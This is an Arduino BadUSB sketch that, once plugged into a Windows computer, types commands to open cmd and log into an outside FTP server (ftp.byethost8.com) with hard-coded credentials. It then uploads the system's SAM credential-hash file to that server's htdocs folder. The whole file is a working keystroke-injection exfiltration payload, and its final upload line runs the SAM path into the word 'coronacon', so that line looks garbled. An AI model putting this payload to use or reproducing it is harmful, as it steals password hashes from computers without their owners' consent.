#include "ArduinoKeyboardLib.h"
#define kbd_es_es

void setup(){

  Keyboard.begin();
    delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
    delay(2000);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("cmd");
  delay(2000);
  Keyboard.write(KEY_RETURN);
  delay(2000);
    Keyboard.print("ftp");
  delay(2000);
    Keyboard.write(KEY_RETURN);
  delay(2000);
      Keyboard.print("open");
  delay(2000);
    Keyboard.write(KEY_RETURN);
  delay(2000);
    Keyboard.print("ftp.byethost8.com");
  delay(2000);
    Keyboard.write(KEY_RETURN);
  delay(2000);
      Keyboard.print("b8_25524806");
  delay(2000);
      Keyboard.write(KEY_RETURN);
  delay(2000);
    Keyboard.print("12345678");
  delay(2000);
        Keyboard.write(KEY_RETURN);
  delay(2000);
      Keyboard.print("cd htdocs");

  delay(2000);
        Keyboard.write(KEY_RETURN);
  delay(2000);  
        Keyboard.print("put c:\\windows\\system32\\config\\samcoronacon");
        Keyboard.write(KEY_RETURN);
  delay(2000);  
}

void loop() {

}
